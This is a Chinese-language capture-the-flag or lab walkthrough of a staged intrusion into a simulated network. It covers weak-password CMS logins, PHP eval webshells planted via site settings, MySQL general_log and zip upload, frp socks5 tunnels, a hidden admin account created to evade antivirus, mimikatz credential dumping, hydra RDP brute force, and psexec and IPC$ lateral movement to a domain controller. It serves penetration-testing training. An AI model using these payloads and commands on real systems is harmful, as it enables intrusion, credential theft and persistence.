# 信息安全渗透赛

[TOC]

## 一、靶场介绍

#### 1.场景介绍

近年来，随着网络安全受到全球广泛关注，各类网络攻防联赛也如雨后春笋般在全国展开，逐步形成培养网安人才的一大优势。让越来越多的网安人才，在参与安全竞赛过程中，得到网络攻防能力的锤炼，增强人员的网安技能，提升个人及团队的综合实力，并在实战中完成行业网络安全人才的选拔。进而实现培养网安人才、护航网络安全的责任使命。

#### 2.场景拓扑

![image-20220615144219563848-1655884054340650.png](img/Untitled.assets/9fdd3bea77362b69ccac2e3fb54cf380.png)

#### 3.攻击路线

![image-20220615144249683124-1655884056053442.png](img/Untitled.assets/d0faa1c8f3116da72c74ddb5d3a3fb73.png)

#### 4.知识点

后台弱口令

远程代码执行

mysql日志写shell

文件上传漏洞

psexec横向移动

hydra RDP爆破

IPC$入侵

#### 5.漏洞编号

CNVD-2020-03899 

CVE-2020-25790

#### 6.Att&ck框架指标/Shield防御指标

T1595 - 主动扫描

T1203 - 利用客户端漏洞获取执行权限

T1068 - 利用漏洞进行权限升级

T1110 - 暴力破解

T1090 - 连接代理

T1570 - 工具横向移动

T1210 - 利用远程服务

T1592 - 收集目标主机信息

T1589 - 收集目标身份信息

T1590 - 收集目标网络信息

#### 7.Engage攻防模型

EAC0006 - 应用多样性

EAC0021 - 攻击向量迁移

EAC0002 - 网络监控

EAC0004 - 网络分析

EAC0003 - 系统活动监控

EAC0014 - 软件操作

## 二、靶场解题（Write up）

#### 阶段一：Web

##### 任务1：弱口令登录后台

已知目标站点`172.16.1.100`，Win10攻击机访问：

![image-20220615134833621402-1655884057389542.png](img/Untitled.assets/f90dd5137f0a52e36106254984dba9f2.png)

确定是行云海cms，访问后台地址`http://172.16.1.100/xyhai.php`

![image-20220615135011766947-1655884058738062.png](img/Untitled.assets/f4e576eb3e8880c402480823cbffb3c4.png)

使用弱口令`admin/123456`成功登录后台：

![image-20220615140609112914-1655884060577573.png](img/Untitled.assets/0caaad2971e5de95a1063bb8d186ea45.png)

##### 任务2：漏洞利用Getshell（T1203 - 利用客户端漏洞获取执行权限）

点击`系统设置`>>`网站设置`，在`站点描述`内插入一句话木马`<?=eval($_POST['pass']);?>`后点击`保存`：

![image-20220615140850799361-1655884061938321.png](img/Untitled.assets/28439b754848e49637fa603a29d61923.png)

保存成功后启动桌面的蚁剑工具：

![image-20220615144612264912-1655884063747651.png](img/Untitled.assets/117276ed3d9a31be2a1e33a92f4ba533.png)

右键空白处点击`添加数据`，shell信息如下：

```
URL地址：http://172.16.1.100/App/Runtime/Data/config/site.php

连接密码：pass
```

![image-20220615144825351541-1655884065487809.png](img/Untitled.assets/0face37b9b3173b1222faa42fa09f7fc.png)

点击`添加`进行添加，双击URL进行文件管理窗口，查找并发现flag：

![image-20220622151404757296-1655884066866155.png](img/Untitled.assets/ad0012681adcf49ffab6d2787f948432.png)

```
flag{3835-58B6-3FF2-341D-7E69-11D6-4539-C916}
```

#### 阶段二：DB

##### 任务3：主机信息收集（T1595 - 主动扫描）

上传s扫描器，路径如下：

![image-20220615145031524943-1655884068277558.png](img/Untitled.assets/7b2fa64a754aa72ce75f586a3bda6911.png)

通过拖拽的方式上传：

![image-20220615145115125560-1655884069634274.png](img/Untitled.assets/82fb2c17e9e77e673b0eca038dcd464f.png)

在s扫描器所在目录下右键打开终端，执行命令进行探测：

```
s.exe tcp 172.16.1.0/24 22,80,135,445,3389,8080 >> 1.txt
```

刷新s扫描器所在目录后查看`1.txt`文件：

![image-20220615150426447932-1655884070988430.png](img/Untitled.assets/c3bead070778df022dfefe615ec67369.png)

文件结尾显示扫描时长，可判断扫描是否结束：

![image-20220615150546299417-1655884072341076.png](img/Untitled.assets/41d714149b5064236ac59565a67a18de.png)

快捷键`Ctrl+F`搜索关键字`Open`，发现存活主机：

![image-20220615150644915169-1655884074164145.png](img/Untitled.assets/4b2bf4a531b6370f63c6614625a7cbec.png)

对存活主机进行端口探测：

```
s.exe tcp 172.16.1.200 1-5000 >> 2.txt
```

![image-20220615150723981529-1655884075530857.png](img/Untitled.assets/b44ac0c1d3d612535aed0cc261d84549.png)

发现主机开放22、80、3306端口，疑似部署mysql服务的linux主机：

![image-20220615151005567186-1655884076884006.png](img/Untitled.assets/3319ceefa98bbf344c5e72acc5e559ce.png)

查看路由表，发现其他网段：

```
route print
```

![image-20220616094159996924-1655884078231489.png](img/Untitled.assets/afcd1b1cdb3ed40adfd956be8bdb63e0.png)

##### 任务4：搭建代理隧道（T1090 - 连接代理、）

进入`C:\Users\Administrator\Desktop\工具\浏览代理\frp\frp_0.37.0_windows_amd64\frp_0.37.0_windows_amd64`目录，修改`frpc.ini`文件为如下内容：

```
[common]
server_addr = 10.10.10.10
server_port = 7000

[ssh]
type = tcp
remote_port = 9998
plugin = socks5
```

将该目录下的`frpc.exe`文件和`frpc.ini`文件上传至蚁剑：

![image-20220615151551963192-1655884079578000.png](img/Untitled.assets/abe2282e199d72df49cad5295aa47d87.png)

`C:\Users\Administrator\Desktop\工具\浏览代理\frp\frp_0.37.0_windows_amd64\frp_0.37.0_windows_amd64`目录下打开命令行，输入命令启动代理服务端：

```
frps.exe -c frps.ini
```

![image-20220615151726176178-1655884080936598.png](img/Untitled.assets/b40eb5440dc289cd369c12256f80ecac.png)

蚁剑中`frpc.exe`文件所在目录下右键打开终端，执行命令启动代理客户端：

```
frpc.exe -c frpc.ini
```

![image-20220615152308864331-1655884082283787.png](img/Untitled.assets/73568a6281842bf6c2fe49f0581446ad.png)

后续任务中若出现访问卡顿，请检查代理流量是否正常，在`frps.exe`的命令行中使用快捷键`Ctrl+C`结束代理服务端，再按`↑`键并回车启动代理服务端。

##### 任务5：数据库信息收集（T1090 - 连接代理）

登录`Kali攻击机`，右键打开终端，修改代理规则：

```
vi /etc/proxychains4.conf
```

![image-20220615152736700111-1655884083631135.png](img/Untitled.assets/b95b96513ef4a86913299e669bdae7b7.png)

尝试使用弱口令`root/123456`连接：

```
proxychains4 mysql -uroot -h172.16.1.200 -p3306 -p

123456
```

连接成功：

![image-20220617131457265622-1655884084978931.png](img/Untitled.assets/95afb876e3925407f851173417f9a4f2.png)

执行命令查看数据库信息：

```
show databases;

use test;                              

show tables;
```

![image-20220615153208262012-1655884086336604.png](img/Untitled.assets/aca1266701211b096a63acc49e6c28ad.png)

查看表信息：

```
show columns from youknow;

select flag from youknow;
```

![image-20220622151915188139-1655884087687005.png](img/Untitled.assets/3315df3faca7d5e992b084224db99862.png)

```
flag{745F-D442-B0D5-B5ED-D881-5DC5-0AB0-960F}
```

##### 任务6：数据库漏洞利用（T1203 - 利用客户端漏洞获取执行权限）

`Win10攻击机`中建立全局代理，启动`Proxifier`：

![image-20220615160849524673-1655884089041839.png](img/Untitled.assets/ce1b8abb024cd6867e26d04ef630e0f4.png)

双击软件图标：

![image-20220615160913611111-1655884090388411.png](img/Untitled.assets/ebe43f7c614ae8b1fd95a3cfc0692dd9.png)

新增代理服务器：

![image-20220615160944345739-1655884091744665.png](img/Untitled.assets/9022f179d5bdd9110d3a5015f170d2b4.png)

![image-20220615160953228193-1655884093090298.png](img/Untitled.assets/5919a0f93488dae73ca4638ff5c15bba.png)

代理信息如下：

![image-20220615161025086566-1655884094448284.png](img/Untitled.assets/5e4ce8d3b1db658c73876dc38d6dbddf.png)

![image-20220615161039726305-1655884095797221.png](img/Untitled.assets/ecea8732d67b0ccc49269082885f48ec.png)

![image-20220615161049390745-1655884097151890.png](img/Untitled.assets/6762a8f193af9dc831a4b04d0d760224.png)

![image-20220615161056563134-1655884098510788.png](img/Untitled.assets/e3697ff7d0979ba95912261cd64a8ae2.png)

若提示未添加则再添加一次。

目标开放80端口，尝试访问：

![image-20220615211828162999-1655884099938732.png](img/Untitled.assets/3a21314b4219893b549c58c6dbfa41aa.png)

提示进行提权操作，右键查看网页源代码，发现网站路径：

![image-20220615211846647664-1655884101287264.png](img/Untitled.assets/3bd841656f9d16776708e52d997d1542.png)

回到`Kali攻击机`尝试提权，查看是否可以读写文件：

```
SHOW VARIABLES LIKE "secure_file_priv";
```

![image-20220615163755905809-1655884102658512.png](img/Untitled.assets/8ee42a7f51b1ce88303aca0d073dd2c3.png)

结果为`NULL`，说明不能读写文件。

查看操作日志是否开启：

```
show variables like 'general_log%';
```

![image-20220615163849389512-1655884104085348.png](img/Untitled.assets/68415f6dd0d37e45ff94544846849892.png)

显示没有开启，发现网站日志路径。

将日志开启并将一句话木马写入网站文件：

```
set global general_log = 'ON';       

set global general_log_file='/var/www/html/index.php'; 

select '<?php @eval($_POST["pass"]);?>';
```

![image-20220615172809419466-1655884105444386.png](img/Untitled.assets/01bd18fd55cc3251938f06c4f3dd7895.png)

回到`Win10攻击机`，使用蚁剑连接：

![image-20220615212158759911-1655884106837599.png](img/Untitled.assets/93ec38a8a454b4f1427045404a22d88c.png)

成功getshell：

![image-20220615212402812464-1655884108230426.png](img/Untitled.assets/bfd72b562f7fe6323eec5fadf8bb9f51.png)

#### 阶段三：Server

##### 任务7：内网主机GetShell（T1595 - 主动扫描）

使用s扫描器探测`192.168.2.0/24`网络：

```
s.exe tcp 192.168.2.0/24 22,80,135,3389,445,8080
```

![image-20220616094830800020-1655884109621418.png](img/Untitled.assets/6d38c6ba4abe7177606eea1b15b54b4b.png)

发现存活主机开放80端口，使用火狐浏览器尝试访问：

![image-20220616111457860018-1655884111058292.png](img/Untitled.assets/cfadcc4ff5b2ccb0b948e84e024ccb7b.png)

判断网站为`Typesetter CMS`，点击`login`：

![image-20220616104806189185-1655884112426010.png](img/Untitled.assets/44e1bdfae53d539b58e8129b9937b33c.png)

弱口令`admin/admin`登录成功：

![image-20220616111707573981-1655884113782272.png](img/Untitled.assets/c43386a9f143f7b5164a924501f16517.png)

上传文件：

![image-20220616111826269362-1655884115138448.png](img/Untitled.assets/ac6872415266962ea0934c4d8c024a24.png)

在`Win10攻击机`桌面新建`shell.php`文件，内容为`<?php @eval($_POST['cmd']);?>`：

![image-20220616112522712500-1655884116492521.png](img/Untitled.assets/36cca40f3d48fb792950a0c7b951b921.png)

将`shell.php`文件压缩为`shell.zip`文件：

![image-20220616112617592766-1655884117797902.png](img/Untitled.assets/a4606e02a2db4a31fe6f7e9670efbe73.png)

双击`file`，右键空白处点击`Upload files`：

![image-20220616112100879653-1655884119102285.png](img/Untitled.assets/dc597b8e73f5cb143d81f77513aee779.png)

将shell.zip通过拖拽的方式上传：

![image-20220616112733835468-1655884120393359.png](img/Untitled.assets/f1d5b2c4f37f026a06c051b66ad36dca.png)

上传成功：

![image-20220616112747440652-1655884121712140.png](img/Untitled.assets/c275b0e51ad1d64f93794519e37254a5.png)

解压：

![image-20220616112827907011-1655884123010804.png](img/Untitled.assets/4b1f65902b764ca0b16405e2bbc836e2.png)

蚁剑连接，shell信息如下：

```
URL地址：http://192.168.2.100/data/_uploaded/file/shell/shell.php

连接密码：cmd
```

![image-20220616113054030744-1655884124314799.png](img/Untitled.assets/be46fb32fff8602c2e50025065a78aed.png)

添加成功后双击URL，发现flag：

![image-20220622152453068450-1655884125604543.png](img/Untitled.assets/90c4323662f08191b64ccb2d58527140.png)

```
flag{A9CF-CBAF-76F0-7C31-F3AA-AE2C-D6E6-C2BD}
```

##### 任务8：信息收集（T1592 - 收集目标主机信息、T1210 - 利用远程服务）

在新增的shell中进入终端，查看权限：

![image-20220616113655272060-1655884126906326.png](img/Untitled.assets/7bcb7bf4fb7d6995d1774b547e4b005c.png)

查询有无杀软：

```
tasklist /svc
```

![image-20220616113859409940-1655884128206336.png](img/Untitled.assets/77450ca31a5b2d1fdeae50e581c1945f.png)

进入杀软匹配工具目录，使用谷歌浏览器打开工具：

![image-20220616113951991458-1655884129529391.png](img/Untitled.assets/0e49e5ea84aae01aa5d07637a8e4a3af.png)

将查询结果拷贝到窗口，点击`查询`：

![image-20220616114046893453-1655884130831520.png](img/Untitled.assets/1831fe8f8e4fe5d4c05b6663d9b2b896.png)

主机存在火绒安全软件，尝试绕过：

![image-20220616114114890213-1655884132219876.png](img/Untitled.assets/93080f16ad1ba34e1a077c5090631f0f.png)

蚁剑中执行命令创建隐藏用户：

```
cd C:\Windows\System32

copy net1.exe net2.txt

net2.txt user hacker$ admin /add  //添加隐藏用户

net2.txt localgroup administrators hacker$ /add   //加入到管理员组中
```

![image-20220616114337933962-1655884133520823.png](img/Untitled.assets/d2b553d7fe7d9b4e06906b276480a519.png)

打开远程桌面：

![image-20220616114400555371-1655884134792540.png](img/Untitled.assets/c6353032185498dba0131e6a4eadbf6b.png)

远程登录信息如下：

```
远程地址：192.168.2.100

登录信息：hacker$/admin
```

提示已有用户登录，点击`是`后等待30秒登录成功：

![image-20220616114639045113-1655884136130212.png](img/Untitled.assets/cd0b25263cdfa904b1b6fd8dfdcb5cd7.png)

登录成功后退出`火绒安全软件`：

![image-20220616114826496801-1655884137444319.png](img/Untitled.assets/26eb2e844d170fbd7d060d74147ae856.png)

![image-20220616114842218612-1655884139403146.png](img/Untitled.assets/b04081fd10577c2e49ed23c5b0f87491.png)

上传密码抓取工具，工具路径如下：

![image-20220616114934441286-1655884140719743.png](img/Untitled.assets/6547bef8ef3b77c4de9bfb20c240d81c.png)

复制粘贴至桌面：

![image-20220616114958826785-1655884142420911.png](img/Untitled.assets/ff23c7d48543b88f29e48ddffaaff909.png)

以管理员权限运行：

![image-20220616115016208460-1655884143741533.png](img/Untitled.assets/791a804b4243fe011ab59a59fc384294.png)

抓取密码：

```
privilege::debug

sekurlsa::logonpasswords full
```

![image-20220616115147842058-1655884145038439.png](img/Untitled.assets/77ce4e83692c861ff4c5105e31ddfa06.png)

#### 阶段四：Client

##### 任务9：横向移动（T1570 - 工具横向移动）

断开远程桌面连接，尝试横向移动到主机`192.168.2.200`，进入工具目录，路径如下：

![image-20220616132402393451-1655884146344873.png](img/Untitled.assets/96fff69479ad3fb59225dac8c6fbbe96.png)

在该目录下打开命令行，执行命令（若出现报错请再试一次）：

```
psexec.exe Administrator:good123@@192.168.2.200
```

![image-20220616132435720968-1655884147645822.png](img/Untitled.assets/dc55f7c0c81fa6bc57d81cb5046ec3a6.png)

获取到目标会话，查看权限：

![image-20220616132533657364-1655884148959582.png](img/Untitled.assets/b415d8bb39bba6191f5f0d63710ea6a4.png)

发现flag：

![image-20220622152844983727-1655884150251876.png](img/Untitled.assets/7c6639a32216b3fd30911589870d98b1.png)

```
flag{7117-9590-F408-7857-68D5-70AA-F442-BD57}
```

查看路由信息：

![image-20220616132811812455-1655884151554558.png](img/Untitled.assets/3e6c17512282aafda9994374b5cbe2c4.png)

##### 任务10：内网代理（T1090 - 连接代理）

修改`C:\Users\Administrator\Desktop\工具\浏览代理\frp\frp_0.37.0_windows_amd64\frp_0.37.0_windows_amd64`目录下的`frpc.ini`文件为如下内容：

```
[common]
server_addr = 172.16.1.100
server_port = 7000

[ssh]
type = tcp
remote_port = 9998
plugin = socks5
```

将`frpc.exe`文件和`fprc.ini`文件复制一份到桌面：

![image-20220616134001818177-1655884152837879.png](img/Untitled.assets/e28498f672319670ca896a06218d7876.png)

将s扫描器文件复制一份到桌面：

![image-20220616134056133441-1655884154136974.png](img/Untitled.assets/1bede999ab5535612cba9c896e28e83b.png)

启动上传工具，路径如下：

![image-20220616133542230683-1655884155456647.png](img/Untitled.assets/d000dfc89561901a76715bdcc932076a.png)

在该目录下打开命令行，执行命令：

```
smbclient.exe Administrator:good123@@192.168.2.200

use c$

put C:\Users\Administrator\Desktop\s.exe

put C:\Users\Administrator\Desktop\frpc.exe

put C:\Users\Administrator\Desktop\frpc.ini
```

![image-20220616134220494370-1655884156759239.png](img/Untitled.assets/879f6eeecde7f06d4ec6a79655cbb987.png)

`psexec.exe`运行的命令行中执行命令进行探测：

```
c:\s.exe tcp 192.168.3.0/24 135,445,3389,22,80,3306,8080 >> hosts.txt
```

![image-20220616134939882472-1655884158436698.png](img/Untitled.assets/808c9918cf7a923d1804b96ed715a6c0.png)

结果显示存在存活主机：

![image-20220616135237265262-1655884159739116.png](img/Untitled.assets/c2ae00189a83536f669265267ce38aed.png)

将`C:\Users\Administrator\Desktop\工具\浏览代理\frp\frp_0.37.0_windows_amd64\frp_0.37.0_windows_amd64`目录下的`frps.exe`文件和`frps.ini`文件上传至蚁剑的`172.16.1.100`主机目录下：

![image-20220616135515313276-1655884161425379.png](img/Untitled.assets/9158efd7b67992eaa656ebc66d78ddc8.png)

蚁剑中在`frps.exe`文件的目录下打开终端启动代理服务端：

```
frps.exe -c frps.ini
```

![image-20220616135634292925-1655884162827791.png](img/Untitled.assets/bd44ad022b01d34bb3c69fcd25dfe647.png)

`psexec.exe`运行的命令行中执行命令启动代理客户端：

```
c:\frpc.exe -c c:\frpc.ini
```

![image-20220616135731142861-1655884164222031.png](img/Untitled.assets/0ece8b09aad4ffe5fc8c753059cd3379.png)

隧道建立成功。

#### 阶段五：User

##### 任务11：密码爆破（T1110 - 暴力破解）

登录`Kali攻击机`，修改代理地址：

![image-20220616140009916724-1655884165536517.png](img/Untitled.assets/ec36291e42ac6fe970cd1d06570e29ad.png)

进入`/root/Desktop/Tools/fuzzDicts/passwordDict`目录，右键打开终端，执行命令爆破：

```
proxychains4 hydra -l Administrator -P top500.txt rdp://192.168.3.100 -V
```

![image-20220617105929038177-1655884166820524.png](img/Untitled.assets/08a00d411862d0454109f423ff25fe24.png)

获取到密码信息，回到`Win10攻击机`，新增代理服务器：

![image-20220616141337966615-1655884168118160.png](img/Untitled.assets/d99466392c6e984a70ac3fef6082b98f.png)

![image-20220616141348834428-1655884169403963.png](img/Untitled.assets/f4a352eb697f44082364ec5236dab944.png)

代理信息如下：

![image-20220616141422816464-1655884170698447.png](img/Untitled.assets/6d849fb3830b0c513e95417e082b39c3.png)

![image-20220616141433642433-1655884171968179.png](img/Untitled.assets/e7d47570786919e2a1350f2353c9daea.png)

设置代理规则：

![image-20220616141445678858-1655884173274570.png](img/Untitled.assets/ad8a74fca6644400d4bc7169bd5b966c.png)

![image-20220616141533774923-1655884174565348.png](img/Untitled.assets/5e9555246ed71dfcfcd4f0aad8fdd31d.png)

![image-20220616141555255752-1655884175862764.png](img/Untitled.assets/19f85baf2a1bc7ac0c34e8a3ae601d2e.png)

启动远程桌面，远程信息如下：

```
远程地址：192.168.3.100

登录账户：Administrator

登录密码：admin@...123
```

提示已有用户登录，点击`是`后等待30秒：

![image-20220617110347334444-1655884177143152.png](img/Untitled.assets/48e4695218963eb4fd673ba2bb06e436.png)

登录成功后获取flag：

![image-20220622153829780721-1655884178503144.png](img/Untitled.assets/613be7c32f5bf311b667a0d0389e267b.png)

```
flag{0863-1D88-2FFB-CF7C-9078-7DC6-AA20-428E}
```

#### 阶段六：DC

##### 任务12：域内信息收集（T1589 - 收集目标身份信息、T1590 - 收集目标网络信息）

进行信息收集：

![image-20220617110544487695-1655884179794837.png](img/Untitled.assets/912fb177f993f687180f1a5f2a6c8031.png)

发现存在域：

![image-20220617110640968954-1655884181081500.png](img/Untitled.assets/20180d41cf976162abb8a1ab4aeeb005.png)

抓取密码，上传mimikatz工具：

![image-20220617111122027626-1655884182356918.png](img/Untitled.assets/851ac2e31fe670235057f6a83e990374.png)

上传成功后以管理员权限启动：

![image-20220617111155310625-1655884183643012.png](img/Untitled.assets/263c0a9fb389a090e6e7609354756d94.png)

```
privilege::debug

sekurlsa::logonpasswords full
```

发现域用户密码信息：

![image-20220617111640759898-1655884184920754.png](img/Untitled.assets/dbc4311ebd48f897303fefbfb2e388b7.png)

断开远程桌面，切换域用户登录：

![image-20220617111906789551-1655884186208511.png](img/Untitled.assets/8d68a485da22474bc37f7b7d8b0f6aea.png)

远程信息：

```
远程地址：192.168.3.100

登录账户：ZSZ\Administrator

登录密码：mygod.dc123
```

登录成功后打开命令行，定位域控：

![image-20220617140149583512-1655884187480180.png](img/Untitled.assets/967781af908bb08578681fe5ee94753b.png)

定位域管用户：

![image-20220617140218313359-1655884188824916.png](img/Untitled.assets/b2510217bbe0c8247aa6448d97ed8d13.png)

确认域管信息：

```
主机地址：192.168.3.200

账户名称：ZSZ\Administrator 

登录密码：mygod.dc123
```

##### 任务13：PTH到域控（T1068 - 利用漏洞进行权限升级、T1570 - 工具横向移动）

查看本地开启的共享：

![image-20220617113936870709-1655884190152312.png](img/Untitled.assets/e862f37eafde933b86ad28d6dd9eb0b5.png)

建立IPC连接：

```
net use \\192.168.3.200\ipc$ "mygod.dc123" /user:"Administrator"
```

![image-20220617114142026231-1655884191509717.png](img/Untitled.assets/1db57bfff4f796b72768ec01c9a6c2aa.png)

将目标C盘映射到本地H盘：

```
net use h: \\192.168.3.200\c$
```

![image-20220617114253317742-1655884192845094.png](img/Untitled.assets/b960fe70599fc6b2d4d46cf8b462996c.png)

打开文件夹，可以看到挂载了目标的磁盘：

![image-20220617114330220497-1655884194177765.png](img/Untitled.assets/ca3177082a147b0bf11389c2eab76e9d.png)

发现flag：

![image-20220622154148477553-1655884195493993.png](img/Untitled.assets/bbbe18b84993fa5ac2b3db8cc6f9c87f.png)

```
flag{B719-1F1D-4CE7-E019-2E6B-EDAC-CB35-87FB}
```

回到`Win10攻击机`，进入`C:\Users\Administrator\Desktop\工具\内网渗透\横向移动\PSTOOLS`目录，将`PsExec64.exe`文件上传：

![image-20220617140921818063-1655884196817570.png](img/Untitled.assets/cece60ef4d7afd7846bd0d38b11b0533.png)

执行命令：

```
cd Desktop

PsExec64.exe -accepteula \\192.168.3.200 -s cmd.exe
```

![image-20220617141042562456-1655884198135256.png](img/Untitled.assets/5ebfb286023ecd323d53ee81a7536537.png)

获取到system权限：

![image-20220617141105232236-1655884199452292.png](img/Untitled.assets/cf9ec81e73dbc2d780ffe11215143864.png)